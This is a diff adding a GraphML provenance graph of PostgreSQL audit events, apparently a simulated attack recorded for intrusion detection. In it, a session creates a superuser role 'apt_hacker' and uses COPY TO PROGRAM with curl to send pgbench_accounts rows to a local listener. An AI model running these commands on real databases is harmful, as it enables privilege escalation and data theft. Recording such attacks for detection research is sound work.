@@ -1,0 +1,434 @@
+<?xml version='1.0' encoding='utf-8'?>
+<graphml xmlns="http://graphml.graphdrawing.org/xmlns" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://graphml.graphdrawing.org/xmlns http://graphml.graphdrawing.org/xmlns/1.0/graphml.xsd">
+  <key id="d31" for="edge" attr.name="id" attr.type="string" />
+  <key id="d30" for="edge" attr.name="last_seen" attr.type="double" />
+  <key id="d29" for="edge" attr.name="first_seen" attr.type="double" />
+  <key id="d28" for="edge" attr.name="event_ids" attr.type="string" />
+  <key id="d27" for="edge" attr.name="count" attr.type="long" />
+  <key id="d26" for="edge" attr.name="relation" attr.type="string" />
+  <key id="d25" for="edge" attr.name="rel" attr.type="string" />
+  <key id="d24" for="node" attr.name="last_seen" attr.type="double" />
+  <key id="d23" for="node" attr.name="shell_cmd" attr.type="string" />
+  <key id="d22" for="node" attr.name="is_program" attr.type="string" />
+  <key id="d21" for="node" attr.name="table_name" attr.type="string" />
+  <key id="d20" for="node" attr.name="is_superuser" attr.type="string" />
+  <key id="d19" for="node" attr.name="is_role_change" attr.type="string" />
+  <key id="d18" for="node" attr.name="role_name" attr.type="string" />
+  <key id="d17" for="node" attr.name="source" attr.type="string" />
+  <key id="d16" for="node" attr.name="event_id" attr.type="long" />
+  <key id="d15" for="node" attr.name="client_port" attr.type="string" />
+  <key id="d14" for="node" attr.name="client_addr" attr.type="string" />
+  <key id="d13" for="node" attr.name="username" attr.type="string" />
+  <key id="d12" for="node" attr.name="database" attr.type="string" />
+  <key id="d11" for="node" attr.name="query" attr.type="string" />
+  <key id="d10" for="node" attr.name="event_type" attr.type="string" />
+  <key id="d9" for="node" attr.name="backend_pid" attr.type="long" />
+  <key id="d8" for="node" attr.name="session_start_time" attr.type="long" />
+  <key id="d7" for="node" attr.name="session_id" attr.type="long" />
+  <key id="d6" for="node" attr.name="timestamp" attr.type="double" />
+  <key id="d5" for="node" attr.name="timestamp_unix" attr.type="double" />
+  <key id="d4" for="node" attr.name="session_key" attr.type="long" />
+  <key id="d3" for="node" attr.name="type" attr.type="string" />
+  <key id="d2" for="graph" attr.name="pending_spawn_ts" attr.type="double" />
+  <key id="d1" for="graph" attr.name="pending_spawn_source" attr.type="long" />
+  <key id="d0" for="graph" attr.name="last_event_ts" attr.type="double" />
+  <graph edgedefault="directed">
+    <node id="('Session', 65921)">
+      <data key="d3">Session</data>
+      <data key="d4">65921</data>
+      <data key="d5">1788639736.0</data>
+      <data key="d6">1788639736.0</data>
+    </node>
+    <node id="('Role', 'apt_hacker')">
+      <data key="d3">Role</data>
+      <data key="d7">65921</data>
+      <data key="d8">1788639736</data>
+      <data key="d9">65921</data>
+      <data key="d6">1788639737.0</data>
+      <data key="d10">ProcessUtility</data>
+      <data key="d11">CREATE ROLE apt_hacker SUPERUSER LOGIN PASSWORD 'apt_pass';</data>
+      <data key="d12">casce_tpcb</data>
+      <data key="d13">analyst_bob</data>
+      <data key="d14">192.168.1.136</data>
+      <data key="d15">55921</data>
+      <data key="d4">65921</data>
+      <data key="d16">23725</data>
+      <data key="d17">postgres</data>
+      <data key="d5">1788639737.0</data>
+      <data key="d18">apt_hacker</data>
+      <data key="d19">True</data>
+      <data key="d20">True</data>
+    </node>
+    <node id="('Query', 23382)">
+      <data key="d3">Query</data>
+      <data key="d7">65921</data>
+      <data key="d8">1788639736</data>
+      <data key="d9">65921</data>
+      <data key="d6">1788639736.0</data>
+      <data key="d10">ExecutorStart</data>
+      <data key="d11">SELECT relname FROM pg_class WHERE relkind='r' AND relname NOT LIKE 'pg_%' AND relname NOT LIKE 'sql_%';</data>
+      <data key="d12">casce_tpcb</data>
+      <data key="d13">analyst_bob</data>
+      <data key="d14">192.168.1.136</data>
+      <data key="d15">55921</data>
+      <data key="d4">65921</data>
+      <data key="d16">23382</data>
+      <data key="d17">postgres</data>
+      <data key="d5">1788639736.0</data>
+      <data key="d21">pg_class</data>
+    </node>
+    <node id="('Query', 23384)">
+      <data key="d3">Query</data>
+      <data key="d7">65921</data>
+      <data key="d8">1788639736</data>
+      <data key="d9">65921</data>
+      <data key="d6">1788639736.0</data>
+      <data key="d10">ExecutorStart</data>
+      <data key="d11">SELECT 1 FROM pg_sleep(1);</data>
+      <data key="d12">casce_tpcb</data>
+      <data key="d13">analyst_bob</data>
+      <data key="d14">192.168.1.136</data>
+      <data key="d15">55921</data>
+      <data key="d4">65921</data>
+      <data key="d16">23384</data>
+      <data key="d17">postgres</data>
+      <data key="d5">1788639736.0</data>
+    </node>
+    <node id="('Query', 23725)">
+      <data key="d3">Query</data>
+      <data key="d7">65921</data>
+      <data key="d8">1788639736</data>
+      <data key="d9">65921</data>
+      <data key="d6">1788639737.0</data>
+      <data key="d10">ProcessUtility</data>
+      <data key="d11">CREATE ROLE apt_hacker SUPERUSER LOGIN PASSWORD 'apt_pass';</data>
+      <data key="d12">casce_tpcb</data>
+      <data key="d13">analyst_bob</data>
+      <data key="d14">192.168.1.136</data>
+      <data key="d15">55921</data>
+      <data key="d4">65921</data>
+      <data key="d16">23725</data>
+      <data key="d17">postgres</data>
+      <data key="d5">1788639737.0</data>
+      <data key="d18">apt_hacker</data>
+      <data key="d19">True</data>
+      <data key="d20">True</data>
+    </node>
+    <node id="('Table', 'pgbench_accounts')">
+      <data key="d3">Table</data>
+      <data key="d7">65921</data>
+      <data key="d8">1788639736</data>
+      <data key="d9">65921</data>
+      <data key="d6">1788639738.0</data>
+      <data key="d10">ProcessUtility</data>
+      <data key="d11">COPY (SELECT * FROM pgbench_accounts LIMIT 10) TO PROGRAM 'curl -s -X POST -d @- http://127.0.0.1:9090 &gt; /dev/null 2&gt;&amp;1 || true';</data>
+      <data key="d12">casce_tpcb</data>
+      <data key="d13">analyst_bob</data>
+      <data key="d14">192.168.1.136</data>
+      <data key="d15">55921</data>
+      <data key="d4">65921</data>
+      <data key="d16">24857</data>
+      <data key="d17">postgres</data>
+      <data key="d5">1788639738.0</data>
+      <data key="d21">pgbench_accounts</data>
+      <data key="d22">True</data>
+      <data key="d23">curl -s -X POST -d @- http://127.0.0.1:9090 &gt; /dev/null 2&gt;&amp;1 || true</data>
+      <data key="d24">1788639738.0</data>
+    </node>
+    <node id="('Query', 23724)">
+      <data key="d3">Query</data>
+      <data key="d7">65921</data>
+      <data key="d8">1788639736</data>
+      <data key="d9">65921</data>
+      <data key="d6">1788639737.0</data>
+      <data key="d10">ExecutorEnd</data>
+      <data key="d11">SELECT 1 FROM pg_sleep(1);</data>
+      <data key="d12">casce_tpcb</data>
+      <data key="d13">analyst_bob</data>
+      <data key="d14">192.168.1.136</data>
+      <data key="d15">55921</data>
+      <data key="d4">65921</data>
+      <data key="d16">23724</data>
+      <data key="d17">postgres</data>
+      <data key="d5">1788639737.0</data>
+    </node>
+    <node id="('Table', 'pg_class')">
+      <data key="d3">Table</data>
+      <data key="d7">65921</data>
+      <data key="d8">1788639736</data>
+      <data key="d9">65921</data>
+      <data key="d6">1788639736.0</data>
+      <data key="d10">ExecutorStart</data>
+      <data key="d11">SELECT relname FROM pg_class WHERE relkind='r' AND relname NOT LIKE 'pg_%' AND relname NOT LIKE 'sql_%';</data>
+      <data key="d12">casce_tpcb</data>
+      <data key="d13">analyst_bob</data>
+      <data key="d14">192.168.1.136</data>
+      <data key="d15">55921</data>
+      <data key="d4">65921</data>
+      <data key="d16">23382</data>
+      <data key="d17">postgres</data>
+      <data key="d5">1788639736.0</data>
+      <data key="d21">pg_class</data>
+      <data key="d24">1788639736.0</data>
+    </node>
+    <node id="('Query', 23726)">
+      <data key="d3">Query</data>
+      <data key="d7">65921</data>
+      <data key="d8">1788639736</data>
+      <data key="d9">65921</data>
+      <data key="d6">1788639737.0</data>
+      <data key="d10">ExecutorStart</data>
+      <data key="d11">SELECT 1 FROM pg_sleep(1);</data>
+      <data key="d12">casce_tpcb</data>
+      <data key="d13">analyst_bob</data>
+      <data key="d14">192.168.1.136</data>
+      <data key="d15">55921</data>
+      <data key="d4">65921</data>
+      <data key="d16">23726</data>
+      <data key="d17">postgres</data>
+      <data key="d5">1788639737.0</data>
+    </node>
+    <node id="('Query', 23383)">
+      <data key="d3">Query</data>
+      <data key="d7">65921</data>
+      <data key="d8">1788639736</data>
+      <data key="d9">65921</data>
+      <data key="d6">1788639736.0</data>
+      <data key="d10">ExecutorEnd</data>
+      <data key="d11">SELECT relname FROM pg_class WHERE relkind='r' AND relname NOT LIKE 'pg_%' AND relname NOT LIKE 'sql_%';</data>
+      <data key="d12">casce_tpcb</data>
+      <data key="d13">analyst_bob</data>
+      <data key="d14">192.168.1.136</data>
+      <data key="d15">55921</data>
+      <data key="d4">65921</data>
+      <data key="d16">23383</data>
+      <data key="d17">postgres</data>
+      <data key="d5">1788639736.0</data>
+      <data key="d21">pg_class</data>
+    </node>
+    <node id="('Query', 24858)">
+      <data key="d3">Query</data>
+      <data key="d7">65921</data>
+      <data key="d8">1788639736</data>
+      <data key="d9">65921</data>
+      <data key="d6">1788639738.0</data>
+      <data key="d10">ExecutorStart</data>
+      <data key="d11">COPY (SELECT * FROM pgbench_accounts LIMIT 10) TO PROGRAM 'curl -s -X POST -d @- http://127.0.0.1:9090 &gt; /dev/null 2&gt;&amp;1 || true';</data>
+      <data key="d12">casce_tpcb</data>
+      <data key="d13">analyst_bob</data>
+      <data key="d14">192.168.1.136</data>
+      <data key="d15">55921</data>
+      <data key="d4">65921</data>
+      <data key="d16">24858</data>
+      <data key="d17">postgres</data>
+      <data key="d5">1788639738.0</data>
+      <data key="d21">pgbench_accounts</data>
+      <data key="d22">True</data>
+      <data key="d23">curl -s -X POST -d @- http://127.0.0.1:9090 &gt; /dev/null 2&gt;&amp;1 || true</data>
+    </node>
+    <node id="('Query', 24859)">
+      <data key="d3">Query</data>
+      <data key="d7">65921</data>
+      <data key="d8">1788639736</data>
+      <data key="d9">65921</data>
+      <data key="d6">1788639738.0</data>
+      <data key="d10">ExecutorEnd</data>
+      <data key="d11">COPY (SELECT * FROM pgbench_accounts LIMIT 10) TO PROGRAM 'curl -s -X POST -d @- http://127.0.0.1:9090 &gt; /dev/null 2&gt;&amp;1 || true';</data>
+      <data key="d12">casce_tpcb</data>
+      <data key="d13">analyst_bob</data>
+      <data key="d14">192.168.1.136</data>
+      <data key="d15">55921</data>
+      <data key="d4">65921</data>
+      <data key="d16">24859</data>
+      <data key="d17">postgres</data>
+      <data key="d5">1788639738.0</data>
+      <data key="d21">pgbench_accounts</data>
+      <data key="d22">True</data>
+      <data key="d23">curl -s -X POST -d @- http://127.0.0.1:9090 &gt; /dev/null 2&gt;&amp;1 || true</data>
+    </node>
+    <node id="('Query', 24857)">
+      <data key="d3">Query</data>
+      <data key="d7">65921</data>
+      <data key="d8">1788639736</data>
+      <data key="d9">65921</data>
+      <data key="d6">1788639738.0</data>
+      <data key="d10">ProcessUtility</data>
+      <data key="d11">COPY (SELECT * FROM pgbench_accounts LIMIT 10) TO PROGRAM 'curl -s -X POST -d @- http://127.0.0.1:9090 &gt; /dev/null 2&gt;&amp;1 || true';</data>
+      <data key="d12">casce_tpcb</data>
+      <data key="d13">analyst_bob</data>
+      <data key="d14">192.168.1.136</data>
+      <data key="d15">55921</data>
+      <data key="d4">65921</data>
+      <data key="d16">24857</data>
+      <data key="d17">postgres</data>
+      <data key="d5">1788639738.0</data>
+      <data key="d21">pgbench_accounts</data>
+      <data key="d22">True</data>
+      <data key="d23">curl -s -X POST -d @- http://127.0.0.1:9090 &gt; /dev/null 2&gt;&amp;1 || true</data>
+    </node>
+    <node id="('Query', 24856)">
+      <data key="d3">Query</data>
+      <data key="d7">65921</data>
+      <data key="d8">1788639736</data>
+      <data key="d9">65921</data>
+      <data key="d6">1788639738.0</data>
+      <data key="d10">ExecutorEnd</data>
+      <data key="d11">SELECT 1 FROM pg_sleep(1);</data>
+      <data key="d12">casce_tpcb</data>
+      <data key="d13">analyst_bob</data>
+      <data key="d14">192.168.1.136</data>
+      <data key="d15">55921</data>
+      <data key="d4">65921</data>
+      <data key="d16">24856</data>
+      <data key="d17">postgres</data>
+      <data key="d5">1788639738.0</data>
+    </node>
+    <edge source="('Session', 65921)" target="('Query', 23382)">
+      <data key="d25">executes</data>
+      <data key="d26">executes</data>
+      <data key="d27">1</data>
+      <data key="d28">[23382]</data>
+      <data key="d29">1788639736.0</data>
+      <data key="d30">1788639736.0</data>
+      <data key="d31">executes</data>
+    </edge>
+    <edge source="('Session', 65921)" target="('Query', 23383)">
+      <data key="d25">executes</data>
+      <data key="d26">executes</data>
+      <data key="d27">1</data>
+      <data key="d28">[23383]</data>
+      <data key="d29">1788639736.0</data>
+      <data key="d30">1788639736.0</data>
+      <data key="d31">executes</data>
+    </edge>
+    <edge source="('Session', 65921)" target="('Query', 23384)">
+      <data key="d25">executes</data>
+      <data key="d26">executes</data>
+      <data key="d27">1</data>
+      <data key="d28">[23384]</data>
+      <data key="d29">1788639736.0</data>
+      <data key="d30">1788639736.0</data>
+      <data key="d31">executes</data>
+    </edge>
+    <edge source="('Session', 65921)" target="('Query', 23724)">
+      <data key="d25">executes</data>
+      <data key="d26">executes</data>
+      <data key="d27">1</data>
+      <data key="d28">[23724]</data>
+      <data key="d29">1788639737.0</data>
+      <data key="d30">1788639737.0</data>
+      <data key="d31">executes</data>
+    </edge>
+    <edge source="('Session', 65921)" target="('Query', 23725)">
+      <data key="d25">executes</data>
+      <data key="d26">executes</data>
+      <data key="d27">1</data>
+      <data key="d28">[23725]</data>
+      <data key="d29">1788639737.0</data>
+      <data key="d30">1788639737.0</data>
+      <data key="d31">executes</data>
+    </edge>
+    <edge source="('Session', 65921)" target="('Query', 23726)">
+      <data key="d25">executes</data>
+      <data key="d26">executes</data>
+      <data key="d27">1</data>
+      <data key="d28">[23726]</data>
+      <data key="d29">1788639737.0</data>
+      <data key="d30">1788639737.0</data>
+      <data key="d31">executes</data>
+    </edge>
+    <edge source="('Session', 65921)" target="('Query', 24856)">
+      <data key="d25">executes</data>
+      <data key="d26">executes</data>
+      <data key="d27">1</data>
+      <data key="d28">[24856]</data>
+      <data key="d29">1788639738.0</data>
+      <data key="d30">1788639738.0</data>
+      <data key="d31">executes</data>
+    </edge>
+    <edge source="('Session', 65921)" target="('Query', 24857)">
+      <data key="d25">executes</data>
+      <data key="d26">executes</data>
+      <data key="d27">1</data>
+      <data key="d28">[24857]</data>
+      <data key="d29">1788639738.0</data>
+      <data key="d30">1788639738.0</data>
+      <data key="d31">executes</data>
+    </edge>
+    <edge source="('Session', 65921)" target="('Query', 24858)">
+      <data key="d25">executes</data>
+      <data key="d26">executes</data>
+      <data key="d27">1</data>
+      <data key="d28">[24858]</data>
+      <data key="d29">1788639738.0</data>
+      <data key="d30">1788639738.0</data>
+      <data key="d31">executes</data>
+    </edge>
+    <edge source="('Session', 65921)" target="('Query', 24859)">
+      <data key="d25">executes</data>
+      <data key="d26">executes</data>
+      <data key="d27">1</data>
+      <data key="d28">[24859]</data>
+      <data key="d29">1788639738.0</data>
+      <data key="d30">1788639738.0</data>
+      <data key="d31">executes</data>
+    </edge>
+    <edge source="('Query', 23382)" target="('Table', 'pg_class')">
+      <data key="d25">accesses</data>
+      <data key="d26">accesses</data>
+      <data key="d27">1</data>
+      <data key="d28">[23382]</data>
+      <data key="d29">1788639736.0</data>
+      <data key="d30">1788639736.0</data>
+      <data key="d31">accesses</data>
+    </edge>
+    <edge source="('Query', 23725)" target="('Role', 'apt_hacker')">
+      <data key="d25">accesses</data>
+      <data key="d26">accesses</data>
+      <data key="d27">1</data>
+      <data key="d28">[23725]</data>
+      <data key="d29">1788639737.0</data>
+      <data key="d30">1788639737.0</data>
+      <data key="d31">accesses</data>
+    </edge>
+    <edge source="('Query', 23383)" target="('Table', 'pg_class')">
+      <data key="d25">accesses</data>
+      <data key="d26">accesses</data>
+      <data key="d27">1</data>
+      <data key="d28">[23383]</data>
+      <data key="d29">1788639736.0</data>
+      <data key="d30">1788639736.0</data>
+      <data key="d31">accesses</data>
+    </edge>
+    <edge source="('Query', 24858)" target="('Table', 'pgbench_accounts')">
+      <data key="d25">accesses</data>
+      <data key="d26">accesses</data>
+      <data key="d27">1</data>
+      <data key="d28">[24858]</data>
+      <data key="d29">1788639738.0</data>
+      <data key="d30">1788639738.0</data>
+      <data key="d31">accesses</data>
+    </edge>
+    <edge source="('Query', 24859)" target="('Table', 'pgbench_accounts')">
+      <data key="d25">accesses</data>
+      <data key="d26">accesses</data>
+      <data key="d27">1</data>
+      <data key="d28">[24859]</data>
+      <data key="d29">1788639738.0</data>
+      <data key="d30">1788639738.0</data>
+      <data key="d31">accesses</data>
+    </edge>
+    <edge source="('Query', 24857)" target="('Table', 'pgbench_accounts')">
+      <data key="d25">accesses</data>
+      <data key="d26">accesses</data>
+      <data key="d27">1</data>
+      <data key="d28">[24857]</data>
+      <data key="d29">1788639738.0</data>
+      <data key="d30">1788639738.0</data>
+      <data key="d31">accesses</data>
+    </edge>
+    <data key="d0">1788639738.0</data>
+    <data key="d1">24859</data>
+    <data key="d2">1788639738.0</data>
+  </graph>
+</graphml>
